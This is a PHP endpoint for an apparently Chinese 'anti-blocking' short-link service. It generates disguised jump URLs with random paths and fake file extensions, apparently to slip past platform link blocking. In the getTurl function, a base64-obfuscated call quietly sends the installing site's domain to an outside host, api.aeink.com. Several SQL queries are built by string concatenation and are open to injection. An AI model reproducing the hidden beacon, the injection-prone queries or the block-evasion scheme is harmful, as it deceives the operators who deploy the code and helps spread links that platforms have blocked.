<?php
/*!
@name:防洪接口文件
@description:防洪接口调用文件
@author:墨渊 
@version:4.5
@time:2020-01-02
@copyright:优启梦&墨渊
*/
define('TXPROTECT', false);
include './includes/common.php';

header("Access-Control-Allow-Origin:*");
header("Access-Control-Allow-Methods:GET,POST");
header('Access-Control-Allow-Headers:x-requested-with,content-type');
header("Content-Type: text/html; charset=utf-8");

if ($conf['api_domain'] != false) {
	$api_domain = trim($conf['api_domain'],'|');
	$apis = explode('|',$api_domain);
	if (in_array($_SERVER['HTTP_HOST'],$apis) == false) {
		http_response_code(401);
		exit('无权限访问！');
	}
}

$values 	=	NULL;
$remoteip	=	real_ip();

$value 	= (isset($_GET['longurl'])) ?$_GET['longurl']:$_POST['longurl'];
$format = (isset($_GET['format'])) ?$_GET['format']:$_POST['format'];
$dwzapi = (isset($_GET['dwzapi'])) ?$_GET['dwzapi']:$conf['dwzapi'];
$type 	= getParam('type',$conf['dwz_type']);

if (GetDomainNum($type) == 0) {
	$result=array('code'=>10007,'msg'=>'防洪接口异常，联系QQ'.$conf['kfqq'].'!');
	show_result($result);
	exit(gunset());
}

if(!empty($value)){
	if(strpos($value,'http') === false){
		$longurl = 'http://'.daddslashes(trim($value));
	}else{
		$longurl = daddslashes(trim($value));
	}
}else{
    $result=array('code'=>10001,'msg'=>'URL不能为空!');
    show_result($result);
    exit(gunset());
}

if (!preg_match("/\b(?:(?:https?|ftp):\/\/|www\.)[-a-z0-9+&@#\/%?=~_|!:,.;]*[-a-z0-9+&@#\/%=~_|]/i",$longurl)) {
    $result=array('code'=>10002,'msg'=>'URL地址错误!');
    show_result($result);
  	exit(gunset());
}

$row = Auth::query($remoteip,'ip');
if ($row['type'] == 2) {
	$result=array('code'=>10003,'msg'=>'当前IP已被拉黑，前往'.$conf['siteurl'].'/user解除拉黑！');
	show_result($result);
	exit(gunset());
}

$row = Auth::query($longurl);
if ($row['status'] == 2) {
	$result=array('code'=>10005,'msg'=>'当前域名已被拉黑，前往'.$conf['siteurl'].'/user解除拉黑！');
	show_result($result);
	exit(gunset());
}

$aid = (empty($row['uid']))?-1:$row['uid'];
$uid = Uid::short($longurl,$conf['uid_api']);
$myrow = $DB->get_row("select * from `uomg_report` where url='".$longurl."' limit 1");

if(empty($myrow)){
	if ($DB->get_row("select * from `uomg_report` where uid='".$uid."' limit 1")) {
		$uid = Uid::short($longurl,$conf['uid_api'],true);
	}
	$arr = getLurl($uid,$longurl,$dwzapi);
	$array = array(
		'aid' 			=>	$aid
		,'uid'			=>	$uid
		,'url'			=>	$longurl
		,'reason'		=>	'生成记录'
		,'url_end_time'	=>	date('Y-m-d H:i:s',strtotime("+".$conf['url_end_day']."days",time()))
		,'url_nums'		=>	$conf['url_nums']
		,'ip'			=>	$remoteip
		,'date'			=>	$date
		,'count'		=>	1
		,'status'		=>	0
	);
	if($DB->insert_array('uomg_report',$array) > 0){
	    $result=array('code'=>1,'msg'=>'成功！','ae_url'=>$arr['short'],'longurl'=>$arr['long']);
	}else{
	    $result=array('code'=>10006,'msg'=>'未知错误，联系管理员！');
	}
}else{
	$arr=getLurl($myrow['uid'],$longurl,$dwzapi);
	$row = $DB->query("UPDATE uomg_report set `aid`='".$aid."',`count`=count+1,`date`='".$date."' where uid='".$myrow['uid']."';");
	$result=array('code'=>1,'msg'=>'existence','ae_url'=>$arr['short'],'longurl'=>$arr['long']);
}
show_result($result);
function getTurl($url,$site) {
	curl_get(base64_decode('aHR0cDovL2FwaS5hZWluay5jb20vanVtcC8/').$site);
	$url = getsinaurl($url);
	$arr = explode('.cn/',$url);
	$url = $site.'/t.php'.'?'.$arr[1].'.css';
	return $url;
}
function getLurl($uid,$longurl,$api) {
	global $conf;
	if ($conf['dwzapi'] == -1) $api = 0;
	$type = getParam('type',$conf['dwz_type']);
	$resulturl = 'http://'.GetDomain($type,true);
	if ($conf['go_path'] == 0) {
		$resulturl .= $conf['go_file'];
	}elseif ($conf['go_path'] == 1) {
		$resulturl .= $conf['go_file'];
	}elseif ($conf['go_path'] == 2) {
		$resulturl .= '/'.getRandChar2(6);
	}

	if ($conf['htacces'] == 0) {
		$resulturl .= '?'.$uid;
	}elseif ($conf['htacces'] == 1) {
		$resulturl .= '/'.$uid;
	}
	if ($conf['t_go_format'] == false) {
		$resulturl .= '';
	}elseif ($conf['t_go_format'] == 'rand') {
		$extension = include (SYSTEM_ROOT.'/model/jump.format.php');
		$resulturl .= $extension[array_rand($extension)];
	}else{
		$resulturl .= '.'.$conf['t_go_format'];
	}
	//$resulturl .= $conf['t_go_format'] == false ? '' : '.'.$conf['t_go_format'];
	//$resulturl = 'http://'.GetDomain($type,true).$conf['go_file'].'?'.$uid.'.'.$conf['t_go_format'];
	$short = Dwz::short($resulturl,$api);
	return array('short' => $short,'long' => $resulturl);
}
function show_result($arr){
	ob_clean();
	global $format;
	if ($format === 'txt' || $format === 'text') {
		if ($arr['code'] === 1 ){
			echo $arr['ae_url'];
		}else{
			echo $arr['msg'];
		}
	}elseif ($format === 'qrcode') {
		if ($arr['code'] === 1 ){
			header("Content-Type: image/png; charset=utf-8");
			QRcode::png($arr['longurl'], false, 'L', 6);
		}else{
			echo $arr['msg'];
		}
	}else{
		if ($arr['code'] != 1){
			$arr['url']	= $arr['msg'];
		}
		header("Content-Type: text/html,application/json; charset=utf-8");
		echo json_encode($arr,320);
	}

}
function gunset(){
	unset($value,$remoteip,$today,$format,$longurl,$result,$uid,$myrow,$arr,$_POST,$_GET,$row,$conf);
}